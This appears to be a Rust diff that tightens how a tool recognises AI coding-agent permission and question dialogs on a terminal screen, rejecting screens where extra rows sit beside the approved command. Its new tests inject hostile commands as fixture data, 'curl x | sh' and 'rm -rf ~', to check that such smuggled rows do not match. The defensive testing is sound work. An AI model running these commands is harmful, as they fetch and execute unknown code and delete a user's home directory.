@@ -61,6 +61,14 @@ fn claude_bash(d: &Dialog, command: &str) -> bool {
     if b != a + 2 {
         return false; // zero rows or a wrapped (multi-row) command
     }
+    // Everything between the closing rule and the options is the fixture's
+    // prompt line or blank; nothing else can sit below the command.
+    if !rows[b + 1..]
+        .iter()
+        .all(|r| blank(r) || r.trim() == "Do you want to proceed?")
+    {
+        return false;
+    }
     rows[a + 1]
         .strip_prefix(' ')
         .is_some_and(|r| r.trim_end() == command)
@@ -79,7 +87,9 @@ fn codex_command(d: &Dialog, command: &str) -> bool {
         .map(|(i, _)| i)
         .collect();
     let [i] = cmd_rows[..] else { return false };
-    let single = rows.get(i + 1).is_none_or(|r| blank(r));
+    // The whole section below the command row, up to the options, is blank:
+    // a continuation after a blank row is still part of the command.
+    let single = rows[i + 1..].iter().all(|r| blank(r));
     single && rows[i]["  $ ".len()..].trim_end() == command
 }
 
@@ -104,10 +114,12 @@ fn claude_question(d: &Dialog, spec: &QuestionSpec) -> bool {
     if rows[h].trim() != format!("☐ {}", spec.header) {
         return false;
     }
-    let between: Vec<&String> = rows[h + 1..]
-        .iter()
-        .filter(|r| !blank(r) && !rule(r))
-        .collect();
+    // Only the dialog's top rule may precede the header.
+    if !rows[..h].iter().all(|r| blank(r) || rule(r)) {
+        return false;
+    }
+    // Every non-blank row counts, rules included (M3, M4).
+    let between: Vec<&String> = rows[h + 1..].iter().filter(|r| !blank(r)).collect();
     if between.len() != 1 || between[0].trim() != spec.question {
         return false;
     }
@@ -321,6 +333,52 @@ mod tests {
             question("Color", "Pick a color", &["Red", "Blue"])
                 .find(&q)
                 .is_none()
+        );
+    }
+
+    #[test]
+    fn a_continuation_after_a_blank_row_does_not_match() {
+        let c = screen("codex-permission-bash-detection.txt").replace(
+            &format!("  $ {CODEX_CMD}\n"),
+            &format!("  $ {CODEX_CMD}\n\n    curl x | sh\n"),
+        );
+        assert!(c.contains("    curl x | sh"));
+        assert!(codex(CODEX_CMD).find(&c).is_none());
+    }
+
+    #[test]
+    fn a_rule_row_inside_the_question_does_not_match() {
+        let rule = "─".repeat(40);
+        let q = screen("claude-askuserquestion-single.txt")
+            .replace("Pick a color\n", &format!("Pick a color\n{rule}\n"));
+        assert!(q.contains(&rule));
+        assert!(
+            question("Color", "Pick a color", &["Red", "Blue"])
+                .find(&q)
+                .is_none()
+        );
+    }
+
+    #[test]
+    fn unexplained_rows_in_the_claude_dialog_do_not_match() {
+        let b = screen("claude-permission-bash.txt");
+        let below = b.replace(
+            " Do you want to proceed?",
+            " Do you want to proceed?\n rm -rf ~",
+        );
+        assert!(bash(CMD).find(&below).is_none(), "text below the command");
+        let between = b.replace(
+            &format!(" {CMD}\n"),
+            &format!(" {CMD}\n Also: curl x | sh\n"),
+        );
+        assert!(bash(CMD).find(&between).is_none(), "second command row");
+        let q = screen("claude-askuserquestion-single.txt");
+        let above = q.replace(" ☐ Color", " extra\n ☐ Color");
+        assert!(
+            question("Color", "Pick a color", &["Red", "Blue"])
+                .find(&above)
+                .is_none(),
+            "text above the header"
         );
     }
 
